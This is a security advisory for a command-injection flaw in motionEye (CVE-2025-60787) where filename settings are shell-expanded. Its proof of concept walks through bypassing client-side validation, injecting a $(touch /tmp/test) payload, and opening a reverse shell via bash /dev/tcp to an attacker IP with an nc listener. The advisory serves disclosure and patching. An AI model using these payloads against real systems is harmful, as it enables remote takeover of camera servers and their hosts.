# [H] motionEye vulnerable to RCE via unsanitized motion config parameter

## Summary
Severity: High
Advisory: GHSA-j945-qm58-4gjx
CVE: CVE-2025-60787
CWE: CWE-116, CWE-78
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2025-11-03
Source: https://github.com/advisories/GHSA-j945-qm58-4gjx
Type: github-advisory

## Affected
- PyPI: `motioneye` — affected >=0 <0.43.1b5

## Details
## Summary
A command injection vulnerability in MotionEye allows attackers to achieve Remote Code Execution (RCE) by supplying malicious values in configuration fields exposed via the Web UI. Because MotionEye writes user-supplied values directly into Motion configuration files without sanitization, attackers can inject shell syntax that is executed when the Motion process restarts. This issue enables full takeover of the MotionEye container and potentially the host environment (depending on container privileges).

## Details
### Root Cause:
MotionEye accepts arbitrary strings from fields such as **image_file_name**  and **movie_filename** in the Web UI. These are written directly into **/etc/motioneye/camera-*.conf**. When MotionEye restarts the Motion service (motionctl.start), the Motion binary reads this configuration. Because Motion treats these fields as shell-expandable, injected characters (e.g. $(), backticks) are interpreted as shell commands.

### Vulnerability flow:
Dashboard (Web UI)
   ↓
ConfigHandler.set_config()
   ↓
camera-*.conf written
   ↓
motionctl.restart()
   ↓
Motion parses config → executes payload


### Affected code:
The issue arises in how config.py handles user input before writing to config files. No sanitization or allowlisting is applied to filename fields.


### Proof of Concept (PoC)

The following steps reproduce the Remote Code Execution (RCE) vulnerability in MotionEye.  
Tested using the official Docker image.

---

#### Environment Setup
1. **Start MotionEye container**  
   Launch the vulnerable container:  
   ```bash
   docker run -d --name motioneye -p 9999:8765 ghcr.io/motioneye-project/motioneye:edge
   ```

2. **Verify version**  
   Confirm the running version inside logs:  
   ```bash
   docker logs motioneye | grep "motionEye server"
   ```  
   **Result:**  
   ```
   motionEye server 0.43.1b4
   ```
    <img width="741" height="168" alt="version_ver" src="https://github.com/user-attachments/assets/ac85d238-da7f-4274-9381-0119c01a1320" />

3. **Container shell access (for verification later)**  
   Keep a shell handy to verify results:  
   ```bash
   docker exec -it motioneye /bin/bash
   ls -la /tmp
   ```

---

#### Exploitation Steps
4. **Access Web Interface**  
   - Open browser at: `http://127.0.0.1:9999`  
   - Login with default credentials: **admin** / *(blank password)*  
   - Add a sample RTSP network camera (required to enable camera-specific settings).
    
    <img width="1623" height="869" alt="add_camera" src="https://github.com/user-attachments/assets/d506a891-8b80-4b69-84f2-b195fcaca0cc" />

5. **Attempt malicious filename input**  
   - Go to: **Camera Settings → Still Images**  
   - In the **Image File Name** field, try:  
     ```bash
     $(touch /tmp/test).%Y-%m-%d-%H-%M-%S
     ```  
   - **Observation:** This is blocked by client-side validation in the browser.
    
    <img width="739" height="104" alt="er1" src="https://github.com/user-attachments/assets/817549fc-5cb2-4959-b29d-5cec745e096b" />
    
    <img width="611" height="90" alt="er2" src="https://github.com/user-attachments/assets/a68eec73-bade-4cc5-b65b-4fc2dfbc7f01" />

6. **Client-Side Validation Discovery**  
   - The check is implemented in JavaScript:  
     - `/static/js/main.js?v=0.43.1b4` → references `/static/js/ui.js?v=0.43.1b4`  
   - Example validation function:  
     ```javascript
     function configUiValid() {
       $('div.settings').find('.validator').each(function () { this.validate(); });
       var valid = true;
       $('div.settings input, select').each(function () {
         if (this.invalid) { valid = false; return false; }
       });
       return valid;
     }
     ```

7. **Bypass Validation**  
   - Open browser console (**F12 → Console tab**)  
   - Override the function to always return true:  
     ```javascript
     configUiValid = function() { return true; };
     ```  
   - This bypasses client-side validation and allows arbitrary values.
    <img width="819" height="539" alt="bypass" src="https://github.com/user-attachments/assets/c18d50cf-1f41-4f31-a23b-23ade9babaa2" />

8. **Inject Payload**  
   - Set **Capture Mode**: `Interval Snapshots`  
   - Set **Interval**: `10`  
   - Set **Image File Name** to the payload:  
     ```bash
     $(touch /tmp/test).%Y-%m-%d-%H-%M-%S
     ```  
   - Click **Apply** to save settings.
    <img width="565" height="344" alt="inject_payload" src="https://github.com/user-attachments/assets/f23e76b2-6af3-490d-bce3-60ac3f96241e" />

9. **Verify Execution**  
   - Inside the container shell:  
     ```bash
     ls -la /tmp
     ```  
   - **Result:** File `/tmp/test` is created with root permissions, confirming code execution.
    <img width="554" height="164" alt="verify" src="https://github.com/user-attachments/assets/11122ba8-becf-4657-bc87-f88f293e8b02" />

---

#### Weaponizing RCE (Reverse Shell Example)
10. **Start attacker listener**  
    ```bash
    nc -lvnp 4444
    ```

11. **Inject reverse shell payload**  
    Enter the following into the **Image File Name** field:  
    ```bash
    $(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/192.168.0.108/4444 0>&1\"')").%Y-%m-%d-%H-%M-%S
    ```

12. **Result**  
    - A reverse shell connects back to the attacker’s machine.  
    - Attacker gains full control of the MotionEye container environment.
    <img width="1140" height="366" alt="final" src="https://github.com/user-attachments/assets/2a8f650f-68f3-43b2-8594-08d5035c16b9" />

---

#### Root Cause
- MotionEye writes unsanitized values (e.g., `image_file_name`) from the Web UI directly into `camera-<id>.conf`.  
- On restart, the `motion` binary parses these fields as shell-expandable strings, leading to arbitrary command execution.  

## Impact
Type: OS Command Injection → Remote Code Execution

Who is impacted:

1. Any MotionEye deployment where attackers can authenticate as admin (or where the UI is left exposed with default/no password).
2. Containerized and bare-metal installs alike.

Potential consequences:

1. Full compromise of MotionEye container.
2. Lateral movement or host compromise if the container runs with privileged permissions or mounts sensitive host volumes.

## References
- https://github.com/motioneye-project/motioneye/security/advisories/GHSA-j945-qm58-4gjx
- https://nvd.nist.gov/vuln/detail/CVE-2025-60787
- https://github.com/motioneye-project/motioneye
- https://github.com/prabhatverma47/motionEye-RCE-through-config-parameter
